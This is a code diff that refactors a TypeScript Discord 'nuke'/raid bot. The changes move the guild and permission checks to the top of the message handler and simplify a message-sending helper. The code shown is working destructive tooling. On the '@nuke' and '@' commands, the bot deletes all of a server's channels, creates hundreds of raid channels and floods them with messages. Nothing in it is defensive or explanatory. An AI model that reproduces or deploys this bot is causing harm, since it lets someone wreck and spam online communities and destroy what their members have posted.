@@ -28,7 +28,12 @@ client.on('ready', () => {
 
 
 client.on('message', async (message: Message) => {
-
+  if (!message.guild) return;
+  
+  const guild: Guild = message.guild;
+  
+  if (!guild.me) return;
+  
   const wrong = (params: String) => {
     return message.channel.send({content: params});
   }
@@ -39,9 +44,6 @@ client.on('message', async (message: Message) => {
 
   ///nuke
   if (message.content === '@nuke') {
-    if (!message.guild) return;
-    const guild: Guild = message.guild;
-
     async function deleteData(): Promise<Guild> {
       await guild.channels.cache.forEach((c) => {
         c.delete()
@@ -63,10 +65,6 @@ client.on('message', async (message: Message) => {
   }
   ///automatic
   if (message.content === '@') {
-    if (!message.guild) return;
-
-    let guild: Guild = message.guild;
-    if (!guild.me) return;
     if (!guild.me.hasPermission('ADMINISTRATOR')) return wrong("No tengo los permisos ncesarios");
     const deleteChannels = async (): Promise<Guild> => {
       await guild.channels.cache.forEach((c) => {
@@ -98,7 +96,7 @@ client.on('message', async (message: Message) => {
       for (let i = 0; i <= 458; i++) {
         if (!message.guild) return;
         const channel = await message.guild.channels.create(raidData.raid_channel);
-        const sendMessages = async (first: Boolean, ms: number) => {
+        const sendMessages = async (ms?: number) => {
           for (let x = 0; x <= 4; x++) {
             if (!channel) {
               continue;
@@ -109,7 +107,7 @@ client.on('message', async (message: Message) => {
               console.log(colors.magenta, 'Sending messages:', reset, e.message);
             });
           }
-          if (first) await sleep(ms * 1000);
+          if (ms) await sleep(ms * 1000);
           return;
         }
 
@@ -130,9 +128,9 @@ client.on('message', async (message: Message) => {
         
         Promise.all([channel, createRoles])
         .then(async res => {
-          await sendMessages(true, 5);
-          await sendMessages(true, 7);  
-          await sendMessages(false, 0);
+          await sendMessages(5);
+          await sendMessages(7);  
+          await sendMessages();
         })
       }
     };
